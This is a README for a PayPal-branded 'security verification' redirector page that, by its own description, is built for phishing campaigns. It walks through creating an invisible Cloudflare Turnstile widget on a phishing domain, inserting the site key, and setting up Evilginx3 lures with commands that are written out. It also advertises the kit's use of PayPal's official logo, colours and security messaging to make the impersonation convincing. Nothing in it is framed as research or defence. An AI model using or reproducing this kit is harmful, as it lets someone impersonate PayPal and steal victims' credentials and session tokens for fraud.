# PayPal Turnstile Redirector

## Overview

This redirector provides a PayPal-branded security verification page using Cloudflare Turnstile CAPTCHA for phishing campaigns.

## Setup Instructions

### 1. Create Cloudflare Turnstile Site

1. Go to https://dash.cloudflare.com/?to=/:account/turnstile
2. Click "Add Site"
3. Configure:
   - **Site name**: PayPal Redirector
   - **Domain**: Your phishing domain
   - **Widget Mode**: **Invisible**
4. Copy the **Site Key**

### 2. Update the Redirector

1. Edit `index.html`
2. Replace the Site Key on line 170:
   ```javascript
   const TURNSTILE_SITEKEY = 'YOUR_ACTUAL_SITE_KEY_HERE';
   ```

### 3. Configure Evilginx3

```
lures create paypal
lures edit 0 redirector paypal_turnstile
lures edit 0 path /security-check
lures get-url 0
```

## Features

- PayPal blue theme (#0070BA, #003087)
- Official PayPal logo
- Security-focused messaging
- Mobile responsive
- 3-second auto-redirect fallback

## Customization

Edit `index.html` to customize:
- Security messages
- Colors and branding
- Redirect timing

## Support

For issues, see main Evilginx3 documentation or Cloudflare Turnstile docs.

